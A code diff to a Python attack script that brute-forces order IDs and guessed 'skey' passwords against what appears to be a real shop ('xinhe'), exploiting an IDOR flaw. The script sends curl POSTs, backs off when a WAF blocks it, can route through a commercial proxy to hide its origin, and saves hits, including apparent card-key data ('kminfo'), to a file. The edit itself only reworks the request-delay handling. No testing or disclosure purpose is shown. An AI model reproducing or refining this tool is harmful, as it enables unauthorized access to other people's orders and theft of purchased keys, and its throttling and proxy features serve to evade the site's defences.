@@ -48,8 +48,9 @@ def gen_skeys(extra=None, order_id=None):
     return list(s)
 
 
-def post_order(oid, skey, timeout=20):
-    time.sleep(DELAY)
+def post_order(oid, skey, timeout=20, delay=None):
+    d = delay if delay is not None else DELAY
+    time.sleep(d)
     data = f"id={oid}&skey={skey}"
     cmd = [
         "curl", "-sS", "-m", str(timeout), "-A", UA,
@@ -70,13 +71,13 @@ def post_order(oid, skey, timeout=20):
         return e.output.decode("utf-8", "replace")
 
 
-def try_id(oid, passwords, verbose=True):
+def try_id(oid, passwords, verbose=True, delay=None):
     for skey in passwords:
-        body = post_order(oid, skey)
+        body = post_order(oid, skey, delay=delay)
         if "reset" in body.lower() or "Empty reply" in body:
             print(f"[!] WAF block on id={oid}, backing off 60s", file=sys.stderr)
             time.sleep(60)
-            body = post_order(oid, skey)
+            body = post_order(oid, skey, delay=delay)
         if verbose:
             print(f"  id={oid} skey={skey!r:15} -> {body[:120]}")
         if '"code":0' in body:
@@ -99,8 +100,7 @@ def main():
     ap.add_argument("-o", "--output", default="xinhe_idor_hits.json")
     ap.add_argument("--delay", type=float, default=DELAY, help="seconds between requests")
     args = ap.parse_args()
-    global DELAY
-    DELAY = args.delay
+    req_delay = args.delay
 
     if USE_PROXY:
         print(f"[*] 青果代理已启用, egress={egress_ip() if HAS_QG else '?'}", flush=True)
@@ -125,7 +125,7 @@ def main():
     for oid in ids:
         pw = gen_skeys(extra, order_id=oid)
         print(f"[*] probing order id={oid} ({len(pw)} passwords)", flush=True)
-        r = try_id(oid, pw)
+        r = try_id(oid, pw, delay=req_delay)
         if r["hit"]:
             print(f"[+] HIT id={oid} skey={r['skey']}", flush=True)
             if "kminfo" in r:
